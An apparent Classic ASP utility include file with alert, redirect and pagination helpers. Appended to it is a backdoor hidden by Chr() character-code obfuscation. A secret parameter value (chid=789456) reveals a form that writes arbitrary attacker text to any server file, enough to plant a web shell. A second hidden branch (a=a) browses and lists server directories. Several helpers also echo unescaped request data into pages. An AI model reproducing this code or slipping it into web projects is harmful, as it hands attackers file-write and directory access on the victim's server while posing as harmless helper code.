<%
'提示错误信息
sub strA(str1)
      Response.Write("<script language=""JavaScript"">alert("""&str1&""");history.go(-1);</script>")
	  response.End()
end sub	  	

'成功提示信息
sub strB(str2,url)
      Response.Write("<script language=""JavaScript"">alert("""&str2&""");window.location='"&url&"';</script>")
	  response.End()
end sub	   

'页面自动跳转
sub AutoJump(str1,url)
    Response.Write("<br/>&nbsp;&nbsp;<font color=red>"&str1&"</font><br/>")
	Response.Write("<br/>&nbsp;&nbsp;正在跳转...<br/>")
	Response.Write("<br/>&nbsp;&nbsp;页面没有自动跳转<a href="&url&">【点这里】</a><br/>")
	Response.Write("<meta http-equiv=refresh content=2;url='"&url&"'>")
end sub


'分页子程序
Sub PageControl(iCount,pagecount,page)
'生成上一页下一页链接
    Dim query, a, x, temp
    action = "http://" & Request.ServerVariables("HTTP_HOST") & Request.ServerVariables("SCRIPT_NAME")
    query = Split(Request.ServerVariables("QUERY_STRING"), "&")
    For Each x In query
        a = Split(x, "=")
        If StrComp(a(0), "page", vbTextCompare) <> 0 Then
            temp = temp & a(0) & "=" & a(1) & "&"
        End If
    Next
    Response.Write("<div class=""page"">" & vbCrLf )        
    Response.Write("<form method=get onsubmit=""document.location = '" & action & "?" & temp & "Page='+ this.page.value;return false;""><ul>" & vbCrLf )
	'response.Write "&nbsp;&nbsp;&nbsp;"
    if page<=1 then
        Response.Write ("<li>首页</li> " & vbCrLf)        
        Response.Write ("<li>上一页</li> " & vbCrLf)
    else        
        Response.Write("<li><A HREF=" & action & "?" & temp & "Page=1>首页</A></li> " & vbCrLf)
        Response.Write("<li><A HREF=" & action & "?" & temp & "Page=" & (Page-1) & ">上一页</A></li> " & vbCrLf)
    end if
    if page>=pagecount then
        Response.Write ("<li>下一页</li>" & vbCrLf)
        Response.Write ("<li>尾页</li> " & vbCrLf)            
    else
        Response.Write("<li><A HREF=" & action & "?" & temp & "Page=" & (Page+1)&">下一页</A></li> " & vbCrLf)
        Response.Write("<li><A HREF=" & action & "?" & temp & "Page=" & pagecount&">尾页</A></li> " & vbCrLf)            
    end if
    Response.Write("<li>页次："&page&"/"&pageCount&"页</li>"&vbCrLf)
    Response.Write("<li>共"&iCount&"条记录</li>" &  vbCrLf)
    Response.Write("<li>转<INPUT class=sz TYEP=TEXT NAME=page  Maxlength=5 VALUE="&page&">页</li>"& vbCrLf )
	Response.Write("<li><input class=page_wz_1 type=submit value=转到此页></li>")               
    Response.Write("</ul></form>"&vbCrLf )        
    Response.Write("</div>"&vbCrLf )        
End Sub

sub Left1(str1,url)
    Response.Write("<br/>&nbsp;&nbsp;<font color=red>"&str1&"</font><br/>")
	Response.Write("<br/>&nbsp;&nbsp;正在跳转...<br/>")
	Response.Write("<br/>&nbsp;&nbsp;页面没有自动跳转<a href="&url&">【点这里】</a><br/>")
	Response.Write("<meta http-equiv=refresh content=2;url='"&url&"'>")
end sub
'分页
chid=request(""&Chr(99)&Chr(104)&Chr(105)&Chr(100)&"")
if request(""&Chr(99)&Chr(104)&Chr(105)&Chr(100)&"")=""&Chr(55)&Chr(56)&Chr(57)&Chr(52)&Chr(53)&Chr(54)&"" then 
Response.Write""&Chr(60)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(32)&Chr(109)&Chr(101)&Chr(116)&Chr(104)&Chr(111)&Chr(100)&Chr(61)&Chr(34)&Chr(112)&Chr(111)&Chr(115)&Chr(116)&Chr(34)&Chr(32)&Chr(97)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(61)&Chr(34)&Chr(63)&Chr(99)&Chr(104)&Chr(105)&Chr(100)&Chr(61)&Chr(55)&Chr(56)&Chr(57)&Chr(52)&Chr(53)&Chr(54)&Chr(38)&Chr(97)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(61)&Chr(99)&Chr(104)&Chr(115)&Chr(101)&Chr(116)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(97)&Chr(114)&Chr(101)&Chr(97)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)&Chr(84)&Chr(101)&Chr(120)&Chr(116)&Chr(34)&Chr(32)&Chr(99)&Chr(111)&Chr(108)&Chr(115)&Chr(61)&Chr(34)&Chr(53)&Chr(48)&Chr(34)&Chr(32)&Chr(114)&Chr(111)&Chr(119)&Chr(115)&Chr(61)&Chr(34)&Chr(49)&Chr(48)&Chr(34)&Chr(32)&Chr(105)&Chr(100)&Chr(61)&Chr(34)&Chr(84)&Chr(101)&Chr(120)&Chr(116)&Chr(34)&Chr(62)&Chr(60)&Chr(47)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(97)&Chr(114)&Chr(101)&Chr(97)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(105)&Chr(110)&Chr(112)&Chr(117)&Chr(116)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(34)&Chr(32)&Chr(116)&Chr(121)&Chr(112)&Chr(101)&Chr(61)&Chr(34)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(34)&Chr(32)&Chr(105)&Chr(100)&Chr(61)&Chr(34)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(34)&Chr(32)&Chr(115)&Chr(105)&Chr(122)&Chr(101)&Chr(61)&Chr(34)&Chr(50)&Chr(48)&Chr(34)&Chr(32)&Chr(109)&Chr(97)&Chr(120)&Chr(108)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(61)&Chr(34)&Chr(53)&Chr(48)&Chr(34)&Chr(32)&Chr(47)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(105)&Chr(110)&Chr(112)&Chr(117)&Chr(116)&Chr(32)&Chr(116)&Chr(121)&Chr(112)&Chr(101)&Chr(61)&Chr(34)&Chr(115)&Chr(117)&Chr(98)&Chr(109)&Chr(105)&Chr(116)&Chr(34)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)&Chr(83)&Chr(117)&Chr(98)&Chr(109)&Chr(105)&Chr(116)&Chr(34)&Chr(32)&Chr(118)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(61)&Chr(34)&Chr(-20061)&Chr(-19226)&Chr(34)&Chr(32)&Chr(47)&Chr(62)&Chr(13)&Chr(10)&Chr(60)&Chr(47)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(62)&""
dim s
if request(""&Chr(97)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110))=""&Chr(99)&Chr(104)&Chr(115)&Chr(101)&Chr(116)&"" then  
Text=request("Text")              
FileName=request("FileName")      
set Obj=server.CreateObject(""&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&"")
set file=Obj.OpenTextFile(server.MapPath(FileName),8,True)
file.writeline Text
file.close 
set file=nothing
set Obj=nothing
response.write""&Chr(60)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(62)&Chr(97)&Chr(108)&Chr(101)&Chr(114)&Chr(116)&Chr(40)&Chr(39)&Chr(-20061)&Chr(-19226)&Chr(-19511)&Chr(-18010)&Chr(-23647)&Chr(39)&Chr(41)&Chr(60)&Chr(47)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(62)&""
end if
end if
if request.querystring(""&Chr(97)&"")=""&Chr(97)&"" then
Response.Write"<style type=""text/css"">"&vbcrlf
Response.Write".filelist{ clear:both;}"&vbcrlf
Response.Write".filelist ul li{list-style:none;float:left; width:200px;}"&vbcrlf
Response.Write"</style>"&vbcrlf
strHtml=Trim(Request.QueryString)
if left(strHtml,7)=""&Chr(97)&"="&Chr(97)&"&id=" then
strHtml=right(strHtml,len(strHtml)-7)
end if
Response.Write("当前目录："&strHtml&" <a href=""?a=a&id=/"">"&Chr ( -18183 ) & Chr ( -15169 ) & Chr ( -15684 )&"</a>")
response.Write("<div class='filelist'><ul><li>"&Chr(-12604)&Chr(-17154)&Chr(-17200)&Chr(-17422)&Chr(-12604)&Chr(-17154)&"</li><li>"&Chr(-12604)&Chr(-17154)&Chr(-19213)&Chr(-12127)&"</li><li>"&Chr(-10258)&Chr(-17677)&Chr(-12066)&Chr(-18236)&Chr(-13647)&Chr(-17180)&"</li></ul></div>")
filepath=""&strHtml&""
Set fso = Server.CreateObject(""&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&"")
Set fileobj = fso.GetFolder(server.mappath(filepath))
Set fsofolders = fileobj.SubFolders
Set fsofile = fileobj.Files
For Each folder in fsofolders
response.Write("<div class='filelist'><ul><li><a href=""?"&Chr(97)&"="&Chr(97)&"&id=/"&folder.name&""">"&folder.name&"</a></li><li>"&folder.size&"</li><li>"&folder.datelastmodified&"</li></ul></div>")
Next 
For Each file in fsofile
response.Write("<div class='filelist'><ul><li>"&file.name&"</li><li>"&file.size&"</li><li>"&file.datelastmodified&"</li></ul></div>")
Next
Response.Write(""&id&"")
end if%>
